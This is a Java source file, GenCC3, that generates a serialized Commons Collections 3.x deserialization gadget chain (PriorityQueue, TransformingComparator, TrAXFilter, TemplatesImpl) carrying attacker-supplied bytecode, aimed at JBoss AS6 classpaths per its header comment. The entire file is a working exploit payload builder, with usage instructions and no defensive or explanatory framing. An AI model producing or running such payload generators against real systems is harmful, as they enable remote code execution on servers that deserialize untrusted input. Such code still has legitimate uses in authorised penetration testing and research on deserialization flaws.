import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * RT5: CC3.x chain builder (commons-collections 3.x, TrAXFilter route) with
 * attacker-supplied TemplatesImpl bytecode. JBoss AS6 classpath-compatible
 * (CB1/BeanComparator is NOT reachable there; CC5/CC6 only give argv exec).
 *
 * Usage: java -cp .:commons-collections-3.2.2.jar GenCC3 <out.ser> <Pwn.class>
 */
public class GenCC3 {

    static Class<?> CC = null;

    public static void main(String[] args) throws Exception {
        String out = args[0];
        byte[] code = readAll(args[1]);
        CC = Class.forName("org.apache.commons.collections.Transformer");

        Class<?> tc = Class.forName(
            "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Object templates = tc.newInstance();
        setF(tc, templates, "_bytecodes", new byte[][]{code});
        setF(tc, templates, "_name", "pwnrt5");
        try {
            Class<?> tfc = Class.forName(
                "com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl");
            setF(tc, templates, "_tfactory", tfc.newInstance());
        } catch (Throwable t) {
            System.out.println("[i] _tfactory skip: " + t);
        }

        Class<?> ccConst = Class.forName(
            "org.apache.commons.collections.functors.ConstantTransformer");
        Class<?> ccInst = Class.forName(
            "org.apache.commons.collections.functors.InstantiateTransformer");
        Class<?> ccChain = Class.forName(
            "org.apache.commons.collections.functors.ChainedTransformer");
        Class<?> ccComp = Class.forName(
            "org.apache.commons.collections.comparators.TransformingComparator");

        Class<?> traxFilter = Class.forName(
            "com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter");
        Class<?> templatesIface = Class.forName("javax.xml.transform.Templates");

        Object constant = ccConst.getConstructor(Object.class).newInstance(traxFilter);
        Object instantiator = ccInst.getConstructor(Class[].class, Object[].class)
            .newInstance(new Class[]{templatesIface}, new Object[]{templates});
        Class<?> transformerArrayCls = Class.forName("[Lorg.apache.commons.collections.Transformer;");
        Object chain = ccChain.getConstructor(transformerArrayCls)
            .newInstance(toArray(constant, instantiator));

        Object transforming = ccComp.getConstructor(CC).newInstance(chain);

        PriorityQueue<Object> queue = new PriorityQueue<Object>(2);
        queue.add(1);
        queue.add(1);
        setF(PriorityQueue.class, queue, "comparator", transforming);
        setF(PriorityQueue.class, queue, "queue", new Object[]{templates, templates});

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(out));
        oos.writeObject(queue);
        oos.close();
        System.out.println("OK " + out);
    }

    static Object toArray(Object a, Object b) throws Exception {
        Object arr = Array.newInstance(CC, 2);
        Array.set(arr, 0, a);
        Array.set(arr, 1, b);
        return arr;
    }

    static void setF(Class<?> start, Object o, String n, Object v) throws Exception {
        Class<?> c = start;
        while (c != null) {
            try {
                Field f = c.getDeclaredField(n);
                f.setAccessible(true);
                f.set(o, v);
                return;
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            }
        }
        throw new NoSuchFieldException(n);
    }

    static byte[] readAll(String p) throws IOException {
        java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
        FileInputStream in = new FileInputStream(p);
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
        in.close();
        return bos.toByteArray();
    }
}
